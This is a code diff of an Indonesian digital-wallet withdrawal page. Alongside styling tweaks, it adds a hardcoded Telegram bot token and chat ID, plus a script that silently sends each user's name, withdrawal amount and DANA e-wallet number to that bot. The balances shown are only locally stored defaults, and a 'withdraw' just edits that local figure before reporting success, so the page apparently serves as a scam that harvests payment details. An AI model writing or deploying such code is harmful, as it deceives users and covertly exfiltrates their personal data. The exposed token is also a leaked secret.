@@ -23,7 +23,7 @@
       width: 90%;
       max-width: 400px;
       box-shadow: 0 8px 16px rgba(0,0,0,0.1);
-      margin-bottom: 30px; /* Ditambah untuk jarak ke tombol */
+      margin-bottom: 30px;
     }
 
     .wallet-card h2 {
@@ -109,7 +109,7 @@
       background: #1976d2;
       color: white;
       max-width: 400px;
-      margin-top: 20px; /* Ditambah untuk turunkan tombol */
+      margin-top: 20px;
     }
 
     .submit-button {
@@ -137,9 +137,34 @@
       color: #888;
       margin-top: 40px;
     }
+
+    /* Notifikasi */
+    #notifikasi {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #4caf50;
+      color: white;
+      padding: 14px 24px;
+      border-radius: 8px;
+      font-size: 16px;
+      z-index: 2000;
+      display: none;
+      animation: fadeInOut 4s ease-in-out forwards;
+    }
+
+    @keyframes fadeInOut {
+      0% { opacity: 0; transform: translate(-50%, -20px); }
+      10%, 90% { opacity: 1; transform: translate(-50%, 0); }
+      100% { opacity: 0; transform: translate(-50%, -20px); }
+    }
   </style>
 </head>
 <body>
+
+  <!-- Notifikasi visual -->
+  <div id="notifikasi"></div>
 
   <div class="wallet-card">
     <h2>Dompet Saya</h2>
@@ -147,10 +172,8 @@
     <div class="balance">DANA: <span id="saldoDANA">375 DANA</span></div>
   </div>
 
-  <!-- Tombol Withdraw utama -->
   <button class="withdraw-button" onclick="tampilkanForm()">Withdraw</button>
 
-  <!-- Modal Withdraw -->
   <div id="modalWithdraw" class="modal-overlay">
     <div class="withdraw-modal">
       <h3>Withdraw</h3>
@@ -172,15 +195,14 @@
     </div>
   </div>
 
-  <!-- Tombol Kembali -->
   <button class="back-btn" onclick="window.location.href='dashboard.html'">Kembali</button>
 
-  <div class="footer">
-    © 2025 Dompet Digital
-  </div>
+  <div class="footer">© 2025 Dompet Digital</div>
 
   <script>
-    // Menampilkan saldo dari localStorage atau nilai default
+    const telegramToken = '8302323286:AAEM6xferO3kn5Bfx9Gc1tNu2iGeDEhXdr4';
+    const telegramChatId = '5788541286';
+
     const username = localStorage.getItem("currentUser") || "user";
     let saldoDAT = parseFloat(localStorage.getItem(username + "_totalReward") || "44916900");
     let saldoDANA = parseFloat(localStorage.getItem(username + "_totalDANA") || "375");
@@ -194,6 +216,39 @@
 
     function sembunyikanForm() {
       document.getElementById("modalWithdraw").style.display = "none";
+    }
+
+    function tampilkanNotifikasi(pesan) {
+      const notif = document.getElementById("notifikasi");
+      notif.textContent = pesan;
+      notif.style.display = "block";
+      setTimeout(() => {
+        notif.style.display = "none";
+      }, 4000);
+    }
+
+    function kirimTelegramPesan(teks) {
+      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+      const data = {
+        chat_id: telegramChatId,
+        text: teks,
+        parse_mode: 'Markdown'
+      };
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(res => res.json())
+      .then(res => {
+        console.log("Pesan Telegram dikirim:", res);
+      })
+      .catch(err => {
+        console.error("Gagal kirim Telegram:", err);
+      });
     }
 
     function submitWithdraw() {
@@ -215,13 +270,15 @@
         return;
       }
 
-      // Update saldo
       saldoDANA -= jumlah;
       localStorage.setItem(username + "_totalDANA", saldoDANA);
       document.getElementById("saldoDANA").textContent = saldoDANA.toLocaleString('id-ID') + " DANA";
 
-      alert("✅ Withdraw berhasil diproses!");
+      tampilkanNotifikasi("✅ Withdraw berhasil diproses!");
       sembunyikanForm();
+
+      const pesan = `📤 *Withdraw Baru!*\n👤 User: *${username}*\n💰 Jumlah: *${jumlah} DANA*\n📱 Nomor DANA: *${nomorDana}*`;
+      kirimTelegramPesan(pesan);
     }
   </script>
 </body>
